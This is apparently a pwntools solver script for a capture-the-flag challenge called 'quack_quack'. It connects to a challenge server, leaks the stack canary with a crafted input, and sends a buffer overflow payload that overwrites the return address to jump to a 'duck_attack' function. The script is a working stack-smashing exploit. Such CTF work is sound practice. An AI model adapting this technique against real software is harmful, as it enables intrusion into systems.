#!/usr/bin/python3
from pwn import *
import warnings
import os
import hexdump

warnings.filterwarnings('ignore')
context.arch = 'amd64'
context.log_level = 'critical'

fname = './quack_quack' 

LOCAL = False

os.system('clear')

if LOCAL:
  print('Running solver locally..\n')
  r    = process(fname)
  
  #gdb.attach(r,'''
  #b *0x00000000004015f3
  #''')
  
else:
  IP   = str(sys.argv[1]) if len(sys.argv) >= 2 else '94.237.59.30'
  PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 49565
  r    = remote(IP, PORT)
  print(f'Running solver remotely at {IP}:{PORT}\n')


r.recvuntil("Quack Quack ")
r.sendline("aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawQuack Quack ")
r.recvuntil("Quack Quack ")

bytes_received = r.recvuntil(", ready",drop=True)

front_end_to_canary = cyclic(88)

address_of_duck_attack = 0x00401383

initial = r.recvuntil("\n\n> ")

r.sendline(front_end_to_canary  + b"\x00" + bytes_received[:-6] + p64(0xaaaaaaaabbbbbbbb)+p64(address_of_duck_attack))

rest = r.recvuntil("Duck?!\n")
print(rest)
rest2 = r.recv()
print(rest2)



